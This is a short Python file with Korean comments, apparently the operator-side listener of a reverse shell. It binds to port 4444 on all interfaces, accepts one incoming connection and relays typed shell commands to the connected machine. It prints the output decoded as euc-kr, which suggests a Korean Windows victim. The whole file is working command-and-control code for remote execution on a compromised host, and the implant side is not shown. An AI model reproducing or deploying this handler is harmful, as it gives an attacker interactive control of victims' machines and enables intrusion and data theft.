# server
import socket


def set_sock(ip, port):
    # TCP 사용
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # port 재사용
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((ip, port))
    # 최대 1개 연결 요청
    s.listen(1)
    conn, addr = s.accept()
    return conn, addr
	

def command(conn, addr):
    print("[+] Connected to", addr)
    while True:
        command = input(">")
        if command == "exit":
            conn.send(b"exit")
            conn.close()
            break
        elif command == "":
            print("Input command...")
        else:
            conn.send(command.encode())
            output = conn.recv(65535)
            # byte를 euc-kr 문자열로 변환 (개행 x)
            print(output.decode("euc-kr", "ignore"), end="")


if __name__ == "__main__":
    ip = "0.0.0.0"  # 0.0.0.0 주소는 모든 로컬 주소와 바인딩가능
    port = 4444
    conn, addr = set_sock(ip, port)
    command(conn, addr)